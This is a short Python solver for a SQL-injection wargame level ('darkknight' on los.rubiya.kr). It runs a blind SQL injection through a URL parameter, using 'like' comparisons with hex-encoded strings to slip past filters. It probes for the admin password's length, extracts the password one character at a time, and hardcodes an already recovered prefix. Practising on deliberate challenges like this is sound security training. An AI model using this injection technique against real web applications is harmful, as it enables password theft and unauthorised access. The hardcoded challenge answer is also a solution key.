import urllib.parse

from constants import *

chall_url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"

pw_len = None
prefix = ""


def find_char(prefix):
    for c in digits_and_lower_case_letters:
        res = make_request(chall_url, "?no=" + urllib.parse.quote(
            f"1 or id like {admin_in_hex} and pw like {ascii_to_hex(prefix + c + '%')}"))
        if hello_admin in res:
            print("Found prefix", prefix + c)
            return prefix + c
    print("did not find char")


pw_len = 8
prefix = "0b70ea1f"

if pw_len is None:
    for i in range(40):
        res = make_request(chall_url, "?no=" + urllib.parse.quote(f"1 or id like {admin_in_hex} and length(pw) < {i}"))
        if hello_admin in res:
            print("Found pw length:", i - 1)
            pw_len = i - 1
            break
    assert pw_len

while len(prefix) < pw_len:
    prefix = find_char(prefix)
    assert prefix

res = make_request(chall_url, f"?pw={prefix}")
check_clear(res)
